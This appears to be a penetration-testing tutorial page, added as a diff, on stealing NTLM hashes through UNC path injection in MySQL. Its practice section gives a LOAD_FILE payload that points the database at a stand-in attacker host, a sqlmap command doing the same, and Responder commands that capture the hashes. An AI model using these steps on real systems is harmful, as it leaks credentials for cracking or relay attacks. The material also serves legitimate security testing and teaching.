@@ -1,0 +1,84 @@
+---
+title: UNC Path NTLM Hash Stealing in MySQL
+description: Learn how to exploit UNC Path injection in MySQL to steal NTLM hashes
+  for unauthorized access.
+keywords:
+- UNC Path injection
+- NTLM hash stealing
+- MySQL exploitation
+- SMB authentication
+- sqlmap
+- Responder
+- network security vulnerabilities
+- SQL injection
+---
+
+# UNC Path - NTLM Hash Stealing
+
+## Context
+
+This article explains how to exploit UNC Path injection in a MySQL environment to steal NTLM hashes. It assumes knowledge of UNC paths, NTLM relay attacks, hash leakage, network authentication, and MySQL Out Of Band Injection techniques. The objective is to teach the method of exploiting SQL injection vulnerabilities to capture sensitive NTLM hashes for potential offline cracking or relay attacks.
+
+## Theory
+
+### UNC Path Injection in MySQL
+
+UNC Path injection is a method that involves manipulating SQL queries to include UNC paths. MySQL can be tricked into making Server Message Block (SMB) requests to an attacker-controlled server, enabling potential data interception.
+
+- **Definition**: UNC Path injection involves the inclusion of a Universal Naming Convention (UNC) path within SQL queries, redirecting operations to remote servers.
+- **Vulnerability Model**: MySQL, when improperly configured, can execute SMB requests to UNC paths specified in SQL queries.
+
+### NTLM Hash Stealing via UNC Path
+
+The process of NTLM hash stealing through UNC Path injection leverages a protocol weakness in NTLM authentication. This method captures hashes sent over SMB, often facilitating unauthorized access.
+
+- **Attack Sequence**: By injecting a UNC path into a SQL query, an attacker can trigger SMB authentication attempts to an attack-controlled server.
+- **Protocol Weakness**: NTLM authentication, when leveraged over SMB, transmits hashes which can be intercepted by attackers.
+
+## Practice
+
+### UNC Path Injection for NTLM Hash Stealing
+
+This method focuses on manually identifying and exploiting SQL injection points to capture NTLM hashes.
+
+- Identify an SQL injection point within the MySQL application.
+- Execute the following command to force the database server to access a remote SMB server controlled by the attacker:
+
+    ```bash
+    SELECT LOAD_FILE('\\\\attacker.com\\share');
+    ```
+
+- Set up an SMB server to capture NTLM hashes using the Responder tool:
+  
+    ```bash
+    Responder -I eth0
+    ```
+
+- Monitor your setup for incoming NTLM authentication requests, indicating that the hashes are being intercepted.
+  
+**Result**: Successful injection allows capture of NTLM hashes, which can be cracked offline or used in relay attacks.
+
+### Automated NTLM Hash Capture
+
+This technique employs automation tools to simplify the process of exploitation and hash capture.
+
+- Use `sqlmap` to automate the injection of the UNC path:
+  
+    ```bash
+    sqlmap -u 'http://target.com/vuln.php?id=1' --file-read='\\\\attacker.com\\share'
+    ```
+
+- Set up Responder to automatically respond to SMB requests and capture hashes:
+  
+    ```bash
+    Responder -I eth0
+    ```
+
+- With this automated setup, NTLM hashes are captured efficiently for further analysis.
+
+**Result**: This automated process leads to efficient capturing of NTLM hashes, facilitating further exploitation avenues.
+
+## Tools
+
+- **Responder**: A tool used for capturing NTLM hashes by setting up a rogue SMB server.
+- **sqlmap**: An automation tool designed for the identification and exploitation of SQL injection vulnerabilities, capable of UNC path injection.
